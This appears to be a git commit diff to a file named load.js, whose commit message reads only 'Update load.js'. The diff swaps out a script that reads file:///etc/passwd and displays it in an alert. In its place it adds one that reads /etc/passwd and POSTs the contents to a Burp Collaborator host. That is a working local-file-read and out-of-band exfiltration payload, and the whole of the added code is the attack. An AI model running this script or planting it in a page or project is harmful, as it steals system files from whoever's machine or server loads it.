59b675ac4402025aed14ac12c3ce9c498acd272e
PreethamBomma <41102108+PreethamBomma@users.noreply.github.com>
2022-03-04 22:26:43 +0530

    Update load.js

--- load.js
+++ load.js
@@ -1,19 +1,5 @@
-function readTextFile(file)
-{
-    var rawFile = new XMLHttpRequest();
-    rawFile.open("GET", file, false);
-    rawFile.onreadystatechange = function ()
-    {
-        if(rawFile.readyState === 4)
-        {
-            if(rawFile.status === 200 || rawFile.status == 0)
-            {
-                var allText = rawFile.responseText;
-                alert(allText);
-            }
-        }
-    }
-    rawFile.send(null);
-}
-
-readTextFile("file:///etc/passwd");
+var request = new XMLHttpRequest();
+	request.open("GET","file:///etc/passwd",false);
+	request.send();
+	request.open("POST","http://mg6bt4mo38hij9jydov0d0o6ixosch.burpcollaborator.net",false);
+	request.send(request.responseText);
